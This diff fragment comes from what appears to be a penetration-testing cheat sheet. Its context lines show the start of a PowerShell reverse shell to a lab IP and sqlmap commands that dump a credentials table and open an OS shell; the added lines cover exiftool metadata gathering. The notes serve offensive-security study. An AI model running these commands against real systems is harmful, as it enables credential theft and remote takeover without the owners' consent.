@@ -248,3 +248,8 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
 - Running sqlmap to Dump Users Credentials Table: ```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump```
 - Running sqlmap with os-shell: ```sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"```
   - 4 >> id >> y >> pwd >> y
+
+# Client-side Info Gathering
+
+- Grab metadata from Document: ```exiftool -a -u brochure.pdf```
+- 
